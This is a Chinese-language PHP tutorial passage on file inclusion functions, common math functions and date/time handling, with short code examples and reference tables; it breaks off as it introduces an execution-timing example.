<h4 id="2-2-文件包含函数"><a href="#2-2-文件包含函数" class="headerlink" title="2.2 文件包含函数"></a><font color="#3CB371" face="Comic sans MS">2.2 文件包含函数</font></h4><p><font face="Comic sans MS">在实际开发中，常常需要把程序中的公用代码放到一个文件中，使用这些代码的文件只需要包含这个文件即可。这种方法有助于提高代码的重用性，给代码的编写与维护带来很大的便利。在PHP中， 有<br><font color="#00B2EE"><strong>include</strong></font><br><font color="#00B2EE"><strong>include_once</strong></font><br><font color="#00B2EE"><strong>require</strong></font><br><font color="#00B2EE"><strong>require_once</strong></font><br>四种方法包含一个文件。<br></font></p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">包含失败</th>
<th align="left">特点</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Inlcude</td>
<td align="center">返回一条警告</td>
<td align="left">文件继续向下执行。通常用于动态包含</td>
</tr>
<tr>
<td align="center">Require</td>
<td align="center">一个致命的错</td>
<td align="left">代码就不会继续向下执行。通常包含极为重要的文件，整个代码甭想执行</td>
</tr>
<tr>
<td align="center">Include_once</td>
<td align="center">返回一条警告</td>
<td align="left">除了原有include的功能以外，它还会做once检测，如果文件曾经已经被被包含过，不再包含</td>
</tr>
<tr>
<td align="center">Require_once</td>
<td align="center">一个致命的错</td>
<td align="left">除了原的功能一外，会做一次once</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**注意：**</font>
1，少用_once带once，因为它会消耗更多的资源去做检测的工作。
2，特高级
Include文件只需要编译一次，因为每次包含include都会再执行一次对应的代码，如何减少include再次执行
时，需要重新解析的过程。
</font></td></tr></table>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. include包含函数的功能。</strong></font><br></font><br>创建一个functions.php文件，里面写上两个函数：<font color="#FF6347">(1)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//functions.php文件</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">demo</span></span>()&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;cccdddd&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>在functions.php的同级目录下，我再创建一个user.php文件把functions.php文件包含进来。这样我的函数就可以专门放在functions.php里面，哪儿需要用到这些函数的时候，我就从哪儿包含进来：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><strong>接下来我们对比include和require：</strong><font color="#FF6347">(2)↓↓</font><br>代码中，我们先用include来<strong>包含不存在</strong>的test.php文件，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line">include <span class="string">&#x27;test.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>再用require包含 不存在的test.php文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line">require <span class="string">&#x27;test.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><font color="#FF6347"><strong>通过上例的对比我们发现：</strong></font><br>(1) 如果test.php文件不存在include 会发出警告继续执行demo()和test()函数。<br>(2) 而requre则直接报错，demo()和test()函数无法继续执行。</p>
</blockquote>
<p>&amp;emsp;<br>我们通过表格知道了:<strong>inlcude</strong> 和<strong>include_once</strong>的区别在于，<font color="#00B2EE"><strong>检测是否重复包含。</strong></font><font color="red"><strong>如果重复包含了include_once不会再包含 对应的文件了，而include 则不管这些。有没引入过文件，都再引入一次。</strong></font>include使用两次会报错，而include_once不会报错！</p>
<p>同样刚刚的user.php我们再实验一下,我们将functions.php包含两次，分别使用<strong>include</strong>和<strong>include_once</strong>：<font color="#FF6347">(3)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">//这儿被包含了两次同样的函数定义文件哟</span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line">include <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行后系统会报错！！！</span><br></pre></td></tr></table></figure>

<p>改为<strong>include_once</strong>再试一次：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">//这儿被包含了两次同样的函数定义文件哟</span><br><span class="line">include_once <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line">include_once <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行后系统不会报错！！！</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong><br>我们在函数定义章节讲过，函数不能定义两次，否则会报错。<font color="#FF7F00"><strong>使用include时</strong></font>，因为我们将 functions.php包含了两次所以执行了两次，<font color="#FF7F00"><strong>因此报这个错误</strong></font>。<br>而<font color="#FF7F00"><strong>include_once不报错</strong></font>的原因是因为：他检测了functions.php曾经包含过，不再进行包含引入了。</p>
</blockquote>
<p><font face="Comic sans MS">而<strong>require</strong>和<strong>require_once</strong>的功能，大家用你最最聪明的小脑袋是不是就能推理出来了呢？require_once有两个特点：</p>
<ol>
<li>包含的文件必须存在，否则停止执行</li>
<li>会做重复包含检查哟</font></li>
</ol>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-3-数学常用函数"><a href="#2-3-数学常用函数" class="headerlink" title="2.3  数学常用函数"></a><font color="#3CB371" face="Comic sans MS">2.3  数学常用函数</font></h4><p>在PHP程序中常常需要进行数据处理运算，这就需要使用数学函数。<font color="#00B2EE"><strong>数学函数是最简单、最常用的系统函数</strong></font>。本章以数学函数为例讲解系统函数的调用方法。</p>
<p>只需要记最常用的一些即可，最常用的列表：</p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="center">描述</th>
<th align="left">实例</th>
<th align="left">输入</th>
<th align="left">输出</th>
</tr>
</thead>
<tbody><tr>
<td align="center">abs()</td>
<td align="center">求绝对值</td>
<td align="left">$abs &#x3D; abs(-4.2); &#x2F;&#x2F;4.2</td>
<td align="left">数字</td>
<td align="left">绝对值数字</td>
</tr>
<tr>
<td align="center">ceil()</td>
<td align="center">进一法取整</td>
<td align="left">echo ceil(9.999); &#x2F;&#x2F; 10</td>
<td align="left">浮点数</td>
<td align="left">进一取整</td>
</tr>
<tr>
<td align="center">floor()</td>
<td align="center">舍去法取整</td>
<td align="left">echo floor(9.999); &#x2F;&#x2F; 9</td>
<td align="left">浮点数</td>
<td align="left">直接舍去小数部分</td>
</tr>
<tr>
<td align="center">fmod()</td>
<td align="center">浮点数取余</td>
<td align="left">“$x &#x3D; 5.7;$y &#x3D; 1.3;<br>$r &#x3D; fmod($x, $y);<br>&#x2F;&#x2F; $r equals 0.5, <br>because 4 *  1.3 + 0.5 &#x3D; 5.7”</td>
<td align="left">两个浮点数,x&gt;y</td>
<td align="left">浮点余数</td>
</tr>
<tr>
<td align="center">pow()</td>
<td align="center">返回数的n次方</td>
<td align="left">echo pow(-1, 20); &#x2F;&#x2F; 1</td>
<td align="left">基础数n次方</td>
<td align="left">乘方值</td>
</tr>
<tr>
<td align="center">round()</td>
<td align="center">浮点数四舍五入</td>
<td align="left">echo round(1.95583, 2);&#x2F;&#x2F; 1.96</td>
<td align="left">一个数值</td>
<td align="left">保留小数点后多少位,默认为0,舍入后的结果</td>
</tr>
<tr>
<td align="center">sqrt()</td>
<td align="center">求平方根</td>
<td align="left">echo sqrt(9); &#x2F;&#x2F;3</td>
<td align="left">被开方的数</td>
<td align="left">平方根</td>
</tr>
<tr>
<td align="center">max()</td>
<td align="center">求最大值</td>
<td align="left">“echo max(1, 3, 5, 6, 7);  <br>&#x2F;&#x2F; 7 echo max(array(2, 4, 5)); <br>&#x2F;&#x2F; 5”</td>
<td align="left">多个数字或数组</td>
<td align="left">返回其中的最大值</td>
</tr>
<tr>
<td align="center">min()</td>
<td align="center">求最小值</td>
<td align="left">min</td>
<td align="left">多个数字或数组</td>
<td align="left">返回其中的最小值</td>
</tr>
<tr>
<td align="center">mt_rand()</td>
<td align="center">更好的随机数</td>
<td align="left">echo mt_rand(0,9);&#x2F;&#x2F;n</td>
<td align="left">最小&#x2F;最大,随机数</td>
<td align="left">随机返回范围内的值</td>
</tr>
<tr>
<td align="center">rand()</td>
<td align="center">随机数</td>
<td align="left">echo rand()</td>
<td align="left">最小&#x2F;最大,随机数</td>
<td align="left">随机返回范围内的值</td>
</tr>
<tr>
<td align="center">pi()</td>
<td align="center">获取圆周率值</td>
<td align="left">echo pi(); <br>&#x2F;&#x2F; 3.1415926535898</td>
<td align="left">无</td>
<td align="left">获取圆周率</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-4-获取时期时间信息函数"><a href="#2-4-获取时期时间信息函数" class="headerlink" title="2.4  获取时期时间信息函数"></a><font color="#3CB371" face="Comic sans MS">2.4  获取时期时间信息函数</font></h4><p><font face="Comic sans MS">在正式学习日期函数前大家得了解几个概念：<br><font color="#00B2EE"><strong>1. 时区</strong><br><strong>2. 世界时</strong><br><strong>3 .unix时间戳</strong></font><br></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>时区</strong></font><br>这个概念，之前大家听说过很多。我们来啰嗦两句，我们现实生活中使用的实区，在电脑里面也是一样有规定的。<br>1884年在华盛顿召开国际经度会议时，为了克服时间上的混乱，规定将全球划分为24个时区。<br>在中国采用首都北京所在地东八区的时间为全国统一使用时间。</p>
</blockquote>
<blockquote>
<p><font color="#FF7F00"><strong>世界时</strong></font><br>不光是天文学家使用格林尼治时间（英文简写:GMT），就是在新闻报刊上也经常出现这个名词。我们知道各地都有各地的地方时间。如果对国际上某一重大事情，用地方时间来记录，就会感到复杂不便．而且将来日子一长容易搞错。因此，天文学家就提出一个大家都能接受且又方便的记录方法，那就是以格林尼治（英国某地区）的地方时间为标准。</p>
</blockquote>
<blockquote>
<p><font color="#FF7F00"><strong>unix时间戳</strong></font><br>电脑本身不认识时间，我们在电脑里面设置一个时间方便运算。于是我们规定了一种计算方式，unix时间戳。<br>从Unix纪元（1970 年 1月1日零时）开始到一个时间经过的秒数。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>1. 设置时区</strong></font><br>如果，我们是跨国的多语方程序，我们通常是通过在配置文件里面来写好了个时区，每次程序运行的时候。都会读取这个时区的设置，来显示时间。</p>
<p>设置时区的函数为：<br>1). <font color="red" ><strong>date_default_timezone_get()</strong></font><br>2). <font color="red" ><strong>date_default_timezone_set()</strong></font><br></font></p>
<p>&amp;emsp;<br><font color="#FF6347">(1)↓↓</font><br>第一个函数就不重点讲解了，比较简单。<br>用法如下：<br><font color="#00B2EE" ><strong>string date_default_timezone_get ( void )</strong></font><br>功能如下：<strong>取得一个脚本中所有日期时间函数所使用的默认时区</strong><br>示例：<br><font color="#00B2EE"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> date_default_timezone_get ();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出:UTC</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="#FF6347">(2)↓↓</font><br>第二个函数是重点：<br>用法如下：<br><font color="#00B2EE" ><strong>bool date_default_timezone_set ( string $timezone_identifier )</strong></font><br>功能如下：<strong>用于所有日期时间函数的默认时区</strong><font color="#00B2EE" >&amp;emsp;[注：<a href="http://php.net/manual/zh/timezones.php">时区列表请详见官方手册</a>]</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//定义一下时区常量，以后你可以放到配置文件里</span><br><span class="line">define(<span class="string">&#x27;TIME_ZONE&#x27;</span>,<span class="string">&#x27;Asia/shanghai&#x27;</span>);</span><br><span class="line"></span><br><span class="line">//执行函数</span><br><span class="line">date_default_timezone_set(TIME_ZONE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出：2019-02-17 13:03:42</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>2. time()获取当前的unix时间戳</strong></font><br>以下代码输出当前时间的Unix时间戳。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   <span class="variable">$time</span>=time();</span><br><span class="line">   print_r( <span class="variable">$time</span>);</span><br><span class="line">?&gt;</span><br><span class="line">程序运行结果：</span><br><span class="line">1421597858</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>3. “亚麻跌”是PHP学习时间处理的关键</strong></font><br><font color="red" ><strong>Y</strong></font> &amp;emsp;英文是 year， 为年份   代表年 ——亚<br><font color="red" ><strong>m</strong></font> &amp;emsp;英文代表month，为月份  代表月 ——麻<br><font color="red" ><strong>d</strong></font> &amp;emsp;英文代表day， 为日期   代表日 ——跌<br><font color="red" ><strong>H:i:s</strong></font> &amp;emsp;代表的是：时分秒<br><font color="red" ><strong>h</strong></font> &amp;emsp;的英文为：hour 代表小时<br><font color="red" ><strong>i</strong></font>&amp;emsp; 的英文为：minute 代表分钟<br><font color="red" ><strong>s</strong></font>&amp;emsp; 的英文为：second 代表秒<br></font></p>
<p>所以我们需要输出前前的年份，月份，日期的话。例如：1997年7月1日，我们就可以用到上面的三个参数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> date(<span class="string">&#x27;Y年m月d日&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">2019年02月17日</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>写全了就是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//就可以显示出来当前的时间了哟。</span><br><span class="line"><span class="built_in">echo</span> date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red" ><strong>date函数</strong></font>用于将一个时间进行格式化输出，以方便时间的显示或存储。其语法格式如下：<br><font color="#00B2EE" ><strong>string date ( string $forrnat [, int $timestamp] )</strong></font><br>在参数列表中:<br>$timestamp是一个时间戳，函数将这个时间戳按$format规定的格式输出。<br>如果$timestamp没有输入值，则默认为当前的时间。<br>$format是一个时间输出格式的字符串，需要使用规定的字符构造输出格式。<br></font></p>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>date函数的格式参数表：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="left">说明</th>
<th align="left">返回值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">d</td>
<td align="left">月份中的第几天，有前导零的2位数字</td>
<td align="left">01到31</td>
</tr>
<tr>
<td align="center">D</td>
<td align="left">英文星期几，3个字母</td>
<td align="left">Mon到Sun</td>
</tr>
<tr>
<td align="center">j</td>
<td align="left">月份中的第几天，没有前导零</td>
<td align="left">1到31</td>
</tr>
<tr>
<td align="center">l(字母)</td>
<td align="left">英文星期几</td>
<td align="left">Sunday到 Saturday</td>
</tr>
<tr>
<td align="center">N</td>
<td align="left">1格式数字表示的星期</td>
<td align="left">1（表示星期一）到7（表示星期天)</td>
</tr>
<tr>
<td align="center">S</td>
<td align="left">每月天数后面的英文后缀，2个字符</td>
<td align="left">st，nd，rd或者th。可以和jg一起用</td>
</tr>
<tr>
<td align="center">w</td>
<td align="left">星期中的第几天，数字表示</td>
<td align="left">0（表示星期天）到 6（表示星期六）</td>
</tr>
<tr>
<td align="center">z</td>
<td align="left">一年中的第几天</td>
<td align="left">0到366</td>
</tr>
<tr>
<td align="center">W</td>
<td align="left">年份中的第几周，每周从星期一开始</td>
<td align="left">42（当年的第42周）</td>
</tr>
<tr>
<td align="center">F</td>
<td align="left">月份，完整的文本格式</td>
<td align="left">January 到 December</td>
</tr>
<tr>
<td align="center">m</td>
<td align="left">数字表示月份，有前导零</td>
<td align="left">01 到 12</td>
</tr>
<tr>
<td align="center">M</td>
<td align="left">3个字母缩写表示的月份</td>
<td align="left">Jan 到Dec</td>
</tr>
<tr>
<td align="center">n</td>
<td align="left">数字表示月份，没有前导零</td>
<td align="left">1 到 12</td>
</tr>
<tr>
<td align="center">t</td>
<td align="left">给定月份所应有的天数</td>
<td align="left">28 到 31</td>
</tr>
<tr>
<td align="center">L</td>
<td align="left">是否为闰年</td>
<td align="left">如果是闰年为1，否则为o</td>
</tr>
<tr>
<td align="center">o</td>
<td align="left">格式年份数字</td>
<td align="left">例如2007</td>
</tr>
<tr>
<td align="center">Y</td>
<td align="left">4 位数字完整表示年份</td>
<td align="left">例如1999或2008</td>
</tr>
<tr>
<td align="center">y</td>
<td align="left">2 位数字表示的年份</td>
<td align="left">例如99或08</td>
</tr>
<tr>
<td align="center">a</td>
<td align="left">小写的上午和下午值</td>
<td align="left">am或pm</td>
</tr>
<tr>
<td align="center">A</td>
<td align="left">大写的上午和下午值</td>
<td align="left">AM或PM</td>
</tr>
<tr>
<td align="center">g</td>
<td align="left">小时，12小时格式，没有前导零</td>
<td align="left">1到12</td>
</tr>
<tr>
<td align="center">G</td>
<td align="left">小时，24小时格式，没有前导零</td>
<td align="left">0 到 23</td>
</tr>
<tr>
<td align="center">i</td>
<td align="left">有前导零的分钟数</td>
<td align="left">00 到 59</td>
</tr>
<tr>
<td align="center">s</td>
<td align="left">秒数，有前导零</td>
<td align="left">00到59</td>
</tr>
<tr>
<td align="center">e</td>
<td align="left">时区标识</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">U</td>
<td align="left">从Unix纪元开始至今的秒数</td>
<td align="left">长整型数字</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>4. getdate获取当前系统时间</strong></font><br><font color="red" ><strong>getdate</strong></font>用来获取当前系统的时间，或者获得一个时间戳的具体含义。时间戳是一个长整数，表示getdate的语法格式如下所示。<br><font color="red" ><strong>array getdate ([ int $timestamp &#x3D; time() ] )</strong></font><br>函数的返回值是一个根据timestamp得到的包含有时间信息的<strong>数组</strong>。如果没有参数，则会返回当前的时间。getdate返回的数组，键名包括时间和日期的完整信息。<br></font></p>
<table>
<thead>
<tr>
<th align="center">键名</th>
<th align="left">说明</th>
<th align="left">返回值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">secnods</td>
<td align="left">秒</td>
<td align="left">数字0到 59</td>
</tr>
<tr>
<td align="center">minutes</td>
<td align="left">分钟</td>
<td align="left">数字0到59</td>
</tr>
<tr>
<td align="center">hours</td>
<td align="left">小时</td>
<td align="left">数字 0到 23</td>
</tr>
<tr>
<td align="center">mday</td>
<td align="left">月份中第几天    数字</td>
<td align="left">1到 31</td>
</tr>
<tr>
<td align="center">wday</td>
<td align="left">星期中第几天    数字</td>
<td align="left">0（表示星期天）到6（表示星期六）</td>
</tr>
<tr>
<td align="center">mon</td>
<td align="left">月份</td>
<td align="left">数字 1 到 12</td>
</tr>
<tr>
<td align="center">year</td>
<td align="left">年</td>
<td align="left">4 位数字表示的完整年份</td>
</tr>
<tr>
<td align="center">yday</td>
<td align="left">一年中第几天    数字</td>
<td align="left">0到365</td>
</tr>
<tr>
<td align="center">weekday</td>
<td align="left">星期几的英文</td>
<td align="left">Sunday到 Saturday</td>
</tr>
<tr>
<td align="center">month</td>
<td align="left">月份的英文</td>
<td align="left">January 到 December</td>
</tr>
<tr>
<td align="center">0</td>
<td align="left">自从Unix纪元开始的秒数</td>
<td align="left">长整型数字</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>以下代码可以返回getdate 数组的详细信息。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$mytime</span>=getdate(); </span><br><span class="line">   print_r( <span class="variable">$mytime</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><strong>print_r</strong>可以输出一个数组中所有的键名与值。运行这段代码，结果如下所示。程序输出当前计算机的时间与日期详细信息：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [seconds] =&gt; <span class="number">1</span>            <span class="comment">//秒</span></span><br><span class="line">    [minutes] =&gt; <span class="number">10</span>            <span class="comment">//分钟</span></span><br><span class="line">    [hours] =&gt; <span class="number">17</span>            <span class="comment">//小时</span></span><br><span class="line">    [mday] =&gt; <span class="number">18</span>            <span class="comment">//日</span></span><br><span class="line">    [wday] =&gt; <span class="number">0</span>            <span class="comment">//星期中的第几天</span></span><br><span class="line">    [mon] =&gt; <span class="number">1</span>            <span class="comment">//月</span></span><br><span class="line">    [year] =&gt; <span class="number">2015</span>            <span class="comment">//年</span></span><br><span class="line">    [yday] =&gt; <span class="number">17</span>            <span class="comment">//年中的第几天</span></span><br><span class="line">    [weekday] =&gt; Sunday        <span class="comment">//星期</span></span><br><span class="line">    [month] =&gt; January        <span class="comment">//月份</span></span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1421597401</span>        <span class="comment">//时间戳</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="#FF6347">↓↓</font>理解了getdate函数和返回的数组以后，就很容易取得当前的时间信息了。下面的代码就是用getdate函数取得时间信息，调用返回时间数组的值输出时间信息。<br><font color="#00B2EE" ></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$mytime</span> = getdate();</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;年 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;year&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;月 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;mon&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;日 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;mday&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;时 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;hours&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;分 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;minutes&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;秒 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;seconds&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;一个小时中的第几钟 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;minutes&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;这是一分钟的第几秒 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;seconds&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;星期名称 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;weekday&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;月份名称 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;month&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;时间戳   :&quot;</span>.<span class="variable">$mytime</span>[0].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">年 :2019 </span><br><span class="line">月 :2 </span><br><span class="line">日 :17 </span><br><span class="line">时 :5 </span><br><span class="line">分 :39 </span><br><span class="line">秒 :34 </span><br><span class="line">一个小时中的第几钟 :39 </span><br><span class="line">这是一分钟的第几秒 :34 </span><br><span class="line">星期名称 :Sunday </span><br><span class="line">月份名称 :February </span><br><span class="line">时间戳 :1550381974</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>5. 日期验证函数</strong></font><br><font color="red" ><strong>checkdate</strong></font>可以判断一个输出的日期是否有效。<br>在实际的工作中，我们需要经常用于检测常用于用户提交表单的数据验证。<br>例如：<strong>验证用户输入的时间是否正确</strong>。<br>函数的语法格式如下：<br><font color="red" ><strong>bool checkdate ( int $month , int $day , int $year )</strong></font><br></font><br>&amp;emsp;<br><font color="red" ></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(checkdate(<span class="number">12</span>, <span class="number">31</span>, <span class="number">2018</span>));</span><br><span class="line">var_dump(checkdate(<span class="number">2</span>, <span class="number">29</span>, <span class="number">2011</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出结果：</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>6.获取本地化时间戳函数</strong></font> </font><br><strong>mktime()函数、strtotime()函数。</strong><br><font color="#00B2EE" >[注：<a href="http://www.php.cn/code/1116.html">使用方法</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-5-检测程序执行时间"><a href="#2-5-检测程序执行时间" class="headerlink" title="2.5  检测程序执行时间"></a><font color="#3CB371" face="Comic sans MS">2.5  检测程序执行时间</font></h4><p><font face="Comic sans MS">我们有的时经常需要做程序的执行时间执行效率判断。</font><br>实现的思路如下：<br><font color="red" ></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//记录开始时间</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//记录结整时</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 开始时间  减去（-）  结束时间  得到程序的运行时间</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br><font face="Comic sans MS">可是不要忘了，程序的运行速度太快了。快到只有0.00000几秒的一刹那。那这个时候大家要记录一个特函的函数了：</font><br><font color="red" ><strong>mixed microtime ([ bool $get_as_float ] )</strong></font><br><strong>microtime()这个函数，能够返回当前 Unix 时间戳和微秒数。</strong><br><font color="red" ></font></p>
<blockquote>
<p><font color="#FF6347"><strong>参数：</strong><br>如果你传入true的话，将会返回一个浮点类型的时间，这样方便参与运算。</font></p>
</blockquote>
<p>模拟一个检测函数执行时间的例子，测试某个函数效率的快慢：</p>
